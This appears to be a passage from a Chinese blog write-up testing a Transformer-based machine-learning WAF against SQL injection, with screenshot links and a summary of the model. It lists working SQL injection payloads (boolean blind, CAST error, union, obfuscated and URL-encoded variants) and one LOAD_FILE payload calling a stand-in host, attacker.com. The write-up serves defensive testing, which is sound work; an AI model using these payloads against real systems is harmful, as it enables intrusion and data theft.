<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260211212513426.png" alt="image-20260211212513426" style="zoom:33%;" />

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260211213050351.png" alt="image-20260211213050351" style="zoom: 50%;" />

WAF拦截万能注入密钥成功。

### 2.union联合注入

不开起防火墙：

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260211213405305.png" alt="image-20260211213405305" style="zoom:33%;" />

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260211213425871.png" alt="image-20260211213425871" style="zoom:33%;" />

union联合注入成功，在不开启防火墙前提下。

开启防火墙：

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260211213552895.png" alt="image-20260211213552895" style="zoom:33%;" />

<img src="C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20260211213601111.png" alt="image-20260211213601111" style="zoom:33%;" />

开启防火墙前提下防御成功。

### 3.布尔盲注

我使用的sqlite数据库，所以使用admin' AND sqlite_version() IS NOT NULL--来查询数据库信息。

不开启防火墙：

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260211214250762.png" alt="image-20260211214250762" style="zoom:33%;" />

开启防火墙：

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260211214308756.png" alt="image-20260211214308756" style="zoom:33%;" />

防御布尔盲注成功

### 4.报错注入

我这里使用的Sqlite数据库，所以不能使用updatexml，extractvalue这些函数，只能使用CAST类型转换错误，但是防火墙还是能够检测到updatexml和extractvalue这些函数。展示：

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260212133041580.png" alt="image-20260212133041580" style="zoom:33%;" />![image-20260212133245378](https://gitee.com/zlinping/tuku2025/raw/master/image-20260212133245378.png)

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260212133308936.png" alt="image-20260212133308936" style="zoom:33%;" />

现在使用CAST报错注入（我没有使用报错信息来完成SQL注入，只是测试一下CAST是否能够使用和是否能够被防火墙检测到）：

sql payload:admin' AND 1=CAST((SELECT 1) AS INTEGER)--

关闭防火墙：

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260212132849337.png" alt="image-20260212132849337" style="zoom:33%;" />

开启防火墙：

防御报错注入成功。

### 5.时间盲注入

使用sqlite的randomblob来完成时间盲注入

关闭防火墙：

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260212134009983.png" alt="image-20260212134009983" style="zoom:33%;" />

开启防火墙：

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260212134028515.png" alt="image-20260212134028515" style="zoom:33%;" />

经过测试一般经典的SQL注入都可以防御成功。在找几个比较复杂的SQL payload进行测试一下。

**payload1:**' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260212134442794.png" alt="image-20260212134442794" style="zoom:33%;" />

拦截成功

**payload2:**'/**/oR%091=1--
%27%20UnI/**/oN%20SeLeCt%201,2,3%20--
' OR (SeLeCt COUNT(*) FrOm users)>0 --
%27%09oR%09IF(1=1,SlEeP(5),0)%20--
' OR ExI/**/sTs(SeLeCt * FrOm users) --

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260212134747815.png" alt="image-20260212134747815" style="zoom:33%;" />

拦截成功

**payload3:**%27%2509oR%2509%28sel/%2A%2150000%2A/ecT%2509GROUP_CONCAT%28username%29%2509FrOm%2509users%29%2509--

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260212135002502.png" alt="image-20260212135002502" style="zoom:33%;" />

拦截成功

OK，测试完毕，该模型基本能够防御大部分SQL payload

## 总结

本项目利用BBPE来完成自然语言处理，将文本转化为机器能够读的懂的语言。然后利用Transformer的Encoder来提取文本特征，然后传给分类层，来完成SQL与正常URL的分类任务。使用该模型作为防火墙，进行了大量测试，基本可以防御大部分SQL payload，包括复杂变异sql payload。

各位可以换成其他的训练数据，比如xxs,ssrf,RCE,信息泄露等其他常见的漏洞。